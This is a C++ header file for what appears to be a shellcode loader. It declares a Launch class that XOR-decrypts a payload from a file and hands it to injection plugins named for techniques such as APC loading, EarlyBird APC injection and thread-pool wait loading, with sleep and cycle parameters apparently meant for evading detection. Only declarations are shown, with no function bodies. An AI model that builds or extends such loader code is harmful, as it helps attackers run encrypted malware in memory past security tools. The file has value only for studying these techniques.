//
// Created by au9u5t on 24-9-30.
//

#ifndef ARINGQUSEMAKEFILE_LAUNCH_H
#define ARINGQUSEMAKEFILE_LAUNCH_H

#include <string>
#include <utility>
#include <Cryptography.h>

#include "../plugin/directlyLoad.h"
#include "../plugin/apcLoad.h"
#include "../plugin/createThreatPoolWaitLoad.h"
#include "../plugin/dynamicLoad.h"
#include "../plugin/dynamicLoadPlusLoad.h"
#include "../plugin/EarlyBirdAPC_InjetcLoad.h"

using startFunction = void (*)(const unsigned char *, const size_t &);
using startFunction2 = void (*)(const unsigned char *, const size_t &, const std::string &);
using generateFunction = void (*)();

class Launch {
private:
    int lessThan{0};
    int greaterThan{0};
    int demo{999999};
    int sleepTime{0};
    int minValue{0};
    int maxValue{0};
    int NUMBER_OF_CYCLES{300};

private:
    std::string filePath;
    std::string method;
    std::string key;
    std::string function_mode;
private:
    void func6N_XORPrep();
    void func6N_XOR(long long int &diff, std::string &encryptedData);
    void funcFile_XOR(std::string &encryptedData);

    void launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength);

    void printMode(const std::string &mode);

    void startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength);
    void startBase(startFunction2 startFunction, const unsigned char *decryptedData, size_t &byteLength, const std::string &name);
public:
    Launch() = default;

    ~Launch() = default;

    Launch(const Launch &) = delete;

    Launch &operator=(const Launch &) = delete;

    Launch(Launch &&) = delete;

    Launch &operator=(Launch &&) = delete;

    Launch(int lessThan, int greaterThan, int demo, int sleepTime, int minValue, int maxValue, int NUMBER_OF_CYCLES) :
            lessThan(lessThan), greaterThan(greaterThan), demo(demo), sleepTime(sleepTime), minValue(minValue),
            maxValue(maxValue), NUMBER_OF_CYCLES(NUMBER_OF_CYCLES) {}

    Launch(std::string &filePath, std::string &method, std::string &key, std::string &function_mode) :
            filePath(std::move(filePath)), method(std::move(method)), key(std::move(key)),
            function_mode(std::move(function_mode)) {}
public:
    void setFilePath(const std::string &filePath) {
        this->filePath = filePath;
    }
    void setMethod(const std::string &method) {
        this->method = method;
    }
    void setKey(const std::string &key) {
        this->key = key;
    }
    void setFunctionMode(const std::string &function_mode) {
        this->function_mode = function_mode;
    }
    void setCycles(const int &cycles) {
        this->NUMBER_OF_CYCLES = cycles;
    }

public:
    void au9u5tDecrypt();
};


#endif //ARINGQUSEMAKEFILE_LAUNCH_H
